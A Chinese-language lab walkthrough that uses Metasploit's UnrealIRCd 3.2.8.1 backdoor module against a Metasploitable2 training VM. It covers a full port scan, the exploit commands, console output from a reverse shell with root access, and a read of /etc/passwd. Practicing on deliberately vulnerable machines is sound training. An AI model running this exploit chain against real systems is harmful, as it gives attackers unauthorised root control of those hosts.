## 使用metasploit利用ircd服务得到root权限

1. 需要准备metasploitable2的VM环境，它是基于ubuntu8.04版本。
2.安装metasploit框架，这里我用的是kali发行版，主要难得去装这个环境，而且kali集成了很多工具。
3. 准备好后，启动metasploitable2和kali,登录kali上去更新一下metasploit。
```bash
[root@kali: ~#] msfupdate
```
4. 进入metasploitable2虚拟机,默认密码账号是msfadmin
```bash
#得到ip地址
msfadmin@metasploitable:~$ ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:0c:29:cf:3a:19  
          inet addr:192.168.199.169  Bcast:192.168.199.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fecf:3a19/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:198973 errors:0 dropped:0 overruns:0 frame:0
          TX packets:200202 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:12035054 (11.4 MB)  TX bytes:12939094 (12.3 MB)
          Interrupt:19 Base address:0x2000 

```
5. 使用nmap扫描192.168.199.169开放的端口,为了方便加个host
```bash
#扫描端口
[root@kali: ~#] nmap -p 0-65535 192.168.199.169 
#会发现IRC服务的端口是开放的，下一步就是利用IRC服务
#ip地址不容易记住，使用hosts
[root@kali: ~#] echo "192.168.199.169 metasploitable2" >> /etc/hosts | tee -a
#测试下
[root@kali: ~#] ping metasploitable2
PING metasploitable2 (192.168.199.169) 56(84) bytes of data.
64 bytes from metasploitable2 (192.168.199.169): icmp_req=1 ttl=64 time=0.407 ms
...
```
6. 更新完成后启动msfconsole,加载ircd exploit
```bash
[root@kali: ~#] msfconsole
msf >
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
#查看选项
msf > show options
#设置RHOST，这里可以不用ip使用刚刚设置的hosts
msf exploit(unreal_ircd_3281_backdoor) > set RHOST 192.168.99.131
#跟上面使用ip一样的
msf exploit(unreal_ircd_3281_backdoor) > set RHOST metasploitable2
RHOST => metasploitable2
msf exploit(unreal_ircd_3281_backdoor) > exploit 

[*] Started reverse double handler
[*] Connected to metasploitable2:6667...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
    :irc.Metasploitable.LAN NOTICE AUTH :*** Found your hostname
[*] Sending backdoor command...
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo FZXI87Tr7vTfa98G;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "FZXI87Tr7vTfa98G\r\n"
[*] Matching...
[*] A is input...

#这里已经得到一个session了
id
uid=0(root) gid=0(root)

whoami
root

#查看root密码
cat /etc/passwd | grep root
root:x:0:0:root:/root:/bin/bash
```
